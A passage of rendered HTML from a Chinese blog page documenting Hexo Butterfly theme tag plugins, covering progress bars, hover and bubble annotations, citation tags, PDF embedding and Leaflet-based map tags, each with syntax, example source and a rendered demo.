data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress [width] [color] [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>width</code>: 0到100的阿拉伯数字</li><li><code>color</code>: 颜色，取值有red,yellow,green,cyan,blue,gray</li><li><code>text</code>:进度条上的文字内容</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress 10 red 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 30 yellow 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 50 green 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 70 cyan 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 90 blue 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 100 gray 进度条样式预览 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-red"  style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-yellow"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 50%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-cyan"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-gray"  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="注释-notation">注释 notation</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota [label] , [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>label</code>: 注释词汇</li><li><code>text</code>: 悬停显示的注解内容</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota 把鼠标移动到我上面试试 ,可以看到注解内容出现在顶栏 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><span class='nota' data-nota='可以看到注解内容出现在顶栏'>把鼠标移动到我上面试试</span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="气泡注释-bubble">气泡注释 bubble</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bubble [content] , [notation] ,[background-color] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>content</code>: 注释词汇</li><li><code>notation</code>: 悬停显示的注解内容</li><li><code>background-color</code>: 可选，气泡背景色。默认为“#71a4e3”</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的&#123;% bubble 兄弟相邻选择器,&quot;例如 h1 + p &#123;margin-top:50px;&#125;&quot; %&#125;，&#123;% bubble flex布局,&quot;Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;,&quot;#ec5830&quot; %&#125;，&#123;% bubble transform变换,&quot;transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。&quot;,&quot;#1db675&quot; %&#125;，animation的&#123;% bubble 贝塞尔速度曲线,&quot;贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋&quot;,&quot;#de4489&quot; %&#125;写法，还有今天刚看到的&#123;% bubble clip-path,&quot;clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。&quot;,&quot;#868fd7&quot; %&#125;属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的<span class="bubble-content">兄弟相邻选择器</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#71a4e3;">例如 h1 + p {margin-top:50px;}</span></span>，<span class="bubble-content">flex布局</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">Flex 是 Flexible Box 的缩写，意为弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;</span></span>，<span class="bubble-content">transform变换</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#1db675;">transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。</span></span>，animation的<span class="bubble-content">贝塞尔速度曲线</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#de4489;">贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋</span></span>写法，还有今天刚看到的<span class="bubble-content">clip-path</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。</span></span>属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="引用文献-reference">引用文献 reference</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% referto [id] , [literature] %&#125;</span><br><span class="line">&#123;% referfrom [id] , [literature] , [url] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>referto 引用上标</p><ul><li><code>id</code>: 上标序号内容，需与referfrom标签的id对应才能实现跳转</li><li><code>literature</code>: 引用的参考文献名称</li></ul></li><li><p>referfrom 引用出处</p><ul><li><code>id</code>: 序号内容，需与referto标签的id对应才能实现 跳转</li><li><code>literature</code>: 引用的参考文献名称</li><li><code>url</code>: 引用的参考文献链接，可省略</li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Akilarの糖果屋(akilar.top)是一个私人性质的博客&#123;% referto &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27; %&#125;，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架&#123;% referto &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27; %&#125;，Butterfly主题&#123;% referto &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">本项目参考了Volantis&#123;% referto &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27; %&#125;的标签样式。引入<span class="code">`[tag].js`</span>，并针对<span class="code">`butterfly`</span>主题修改了相应的<span class="code">`[tag].styl`</span>。在此鸣谢<span class="code">`Volantis`</span>主题众开发者。</span><br><span class="line">主要参考内容包括各个volantis的内置标签插件文档&#123;% referto &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27; %&#125;</span><br><span class="line">Butterfly主题的各个衍生魔改&#123;% referto &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27; %&#125;&#123;% referto &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27; %&#125;&#123;% referto &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27; %&#125;&#123;% referto &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% referfrom &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27;,&#x27;https://jq.qq.com/?<span class="emphasis">_wv=1027&amp;k=pGLB2C0N&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27;,&#x27;https://hexo.io/zh-cn/docs/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27;,&#x27;https://butterfly.js.org/posts/21cfbf15/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27;,&#x27;https://volantis.js.org/v5/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27;,&#x27;https://volantis.js.org/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27;,&#x27;https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27;,&#x27;https://lovelijunyi.gitee.io/posts/c898.html&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27;,&#x27;https://github.com/l-lin/font-awesome-animation&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27;,&#x27;https://www.antmoe.com/posts/3b43914f/&#x27; %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>Akilarの糖果屋(akilar.top)是一个私人性质的博客<span class="hidden-anchor" id="referto_[1]"></span><sup class="reference"><a href="#referfrom_[1]">[1]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Akilarの糖果屋群聊简介</span><span class="reference-title">参考资料</span></span></span>，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架<span class="hidden-anchor" id="referto_[2]"></span><sup class="reference"><a href="#referfrom_[2]">[2]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Hexo中文文档</span><span class="reference-title">参考资料</span></span></span>，Butterfly主题<span class="hidden-anchor" id="referto_[3]"></span><sup class="reference"><a href="#referfrom_[3]">[3]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档(一) 快速开始</span><span class="reference-title">参考资料</span></span></span></p><p>本项目参考了Volantis<span class="hidden-anchor" id="referto_[4]"></span><sup class="reference"><a href="#referfrom_[4]">[4]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">hexo-theme-volantis 标签插件</span><span class="reference-title">参考资料</span></span></span>的标签样式。引入 <code>[tag].js</code>，并针对 <code>butterfly</code>主题修改了相应的 <code>[tag].styl</code>。在此鸣谢 <code>Volantis</code>主题众开发者。<br>主要参考内容包括各个volantis的内置标签插件文档<span class="hidden-anchor" id="referto_[5]"></span><sup class="reference"><a href="#referfrom_[5]">[5]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Volantis文档:内置标签插件</span><span class="reference-title">参考资料</span></span></span><br>Butterfly主题的各个衍生魔改<span class="hidden-anchor" id="referto_[6]"></span><sup class="reference"><a href="#referfrom_[6]">[6]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档:标签外挂（Tag Plugins</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[7]"></span><sup class="reference"><a href="#referfrom_[7]">[7]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小弋の生活馆全样式预览</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[8]"></span><sup class="reference"><a href="#referfrom_[8]">[8]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">l-lin-font-awesome-animation</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[9]"></span><sup class="reference"><a href="#referfrom_[9]">[9]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小康的butterfly主题使用文档</span><span class="reference-title">参考资料</span></span></span></p><div class="reference-source"><span class="hidden-anchor" id="referfrom_[1]"></span><a class="reference-anchor" href="#referto_[1]">[1]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://jq.qq.com/?_wv=1027&k=pGLB2C0N">Akilarの糖果屋群聊简介</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[2]"></span><a class="reference-anchor" href="#referto_[2]">[2]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://hexo.io/zh-cn/docs/">Hexo中文文档</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[3]"></span><a class="reference-anchor" href="#referto_[3]">[3]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安装文档(一) 快速开始</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[4]"></span><a class="reference-anchor" href="#referto_[4]">[4]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/v5/tag-plugins/">hexo-theme-volantis 标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[5]"></span><a class="reference-anchor" href="#referto_[5]">[5]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/tag-plugins/">Volantis文档:内置标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[6]"></span><a class="reference-anchor" href="#referto_[6]">[6]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">Butterfly 安装文档:标签外挂（Tag Plugins</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[7]"></span><a class="reference-anchor" href="#referto_[7]">[7]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://lovelijunyi.gitee.io/posts/c898.html">小弋の生活馆全样式预览</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[8]"></span><a class="reference-anchor" href="#referto_[8]">[8]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://github.com/l-lin/font-awesome-animation">l-lin-font-awesome-animation</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[9]"></span><a class="reference-anchor" href="#referto_[9]">[9]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://www.antmoe.com/posts/3b43914f/">小康的butterfly主题使用文档</a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="PDF展示">PDF展示</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf 文件路径 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>文件路径</code>: 可以是相对路径或者是在线链接</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 1.本地文件:在md文件路径下创建一个同名文件夹，其内放pdf文件名为xxx.pdf的文件</span></span><br><span class="line">&#123;% pdf xxx.pdf %&#125;</span><br><span class="line"><span class="section"># 2.在线链接</span></span><br><span class="line">&#123;% pdf https://fastly.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>2.在线链接(要放到最外层才能起作用)</p><pre><code>&lt;div class=&quot;row&quot;&gt;&lt;embed src=&quot;https://fastly.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;&lt;/div&gt;</code></pre><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="Hexo-tag-map-插件">Hexo-tag-map 插件</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% + 标签值 + 经度 + 纬度 + 文本 + 缩放等级 + 宽 + 高 + 默认图层 + %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th style="text-align:center">地图名</th><th style="text-align:center">标签值 &lt;必填&gt;</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">缩放等级 (默认 14)</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">默认图层 (默认 1)</th></tr></thead><tbody><tr><td style="text-align:center">混合地图</td><td style="text-align:center">map</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~7</td></tr><tr><td style="text-align:center">谷歌地图</td><td style="text-align:center">googleMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~20</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">高德地图</td><td style="text-align:center">gaodeMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">百度地图</td><td style="text-align:center">baiduMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 4~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~2</td></tr><tr><td style="text-align:center">Geoq 地图</td><td style="text-align:center">geoqMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~5</td></tr><tr><td style="text-align:center">openstreet 地图</td><td style="text-align:center">openstreetMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">不支持此参数</td></tr></tbody></table><ol><li>参数之间，用英文逗号相隔</li><li>参数必须按上述事例顺序输入，不得为空</li><li>同一个页面，同一组经纬度值，只能插入一个相同标签值的地图 (若有需要，可以将第二个地图上，经度或纬度末尾删除一两个数)</li><li>参数取值必须在上述范围内</li><li>默认图层：即地图叠加层的值，默认常规地图还是卫星地图，可按地图显示顺序取值</li><li>缩放等级，数字越大，地图比例尺越小，显示的越精细</li><li>除标签值外，其他参数选填，但 每个参数的左边的参数必填</li><li>谷歌地图需要外网才能加载查看</li></ol><p>坐标获取：<a href="https://lbs.amap.com/tools/picker">高德地图坐标拾取系统</a> 、<a href="https://api.map.baidu.com/lbsapi/getpoint/index.html">百度地图坐标拾取系统</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% map 120.101101,30.239119 %&#125;</span><br><span class="line">&#123;% googleMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！ %&#125;</span><br><span class="line">&#123;% geoqMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！, 13, 90%, 320px, 3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div class="map-box" style="margin: 0.8rem 0 1.6rem 0;"><div id="map-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div></div><script type="text/javascript">var normalm=L.tileLayer.chinaProvider('GaoDe.Normal.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imgm=L.tileLayer.chinaProvider('GaoDe.Satellite.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imga=L.tileLayer.chinaProvider('GaoDe.Satellite.Annotion',{maxZoom:20,minZoom:1,attribution:'高德地图'});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:20,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'});routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1,attribution:'Google Maps'});var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:21,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm]),image=L.layerGroup([imgm,imga]);var baseLayers={"高德地图":normal,"智图地图":normalm1,"谷歌地图":normalMap,"高德卫星地图":imgm,"谷歌卫星地图":satelliteMap,"高德卫星标注":image,"谷歌卫星标注":routeMap};var mymap=L.map('map-120.101101-30.239119',{center:[30.239119,120.101101],zoom:14,layers:[normal],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);</script>`<br>`<link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="googleMap-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:22,minZoom:1,attribution:'Google Maps'});var baseLayers={"谷歌地图":normalMap,"谷歌卫星图":satelliteMap,"谷歌卫星标注": routeMap};var overlayLayers={};var mymap=L.map("googleMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:14,layers:[normalMap],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script>`<br>`<link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="geoqMap-120.101101-30.239119" style="max-width:90%; height:320px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm2=L.tileLayer.chinaProvider('Geoq.Normal.PurplishBlue',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm3=L.tileLayer.chinaProvider('Geoq.Normal.Gray',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var 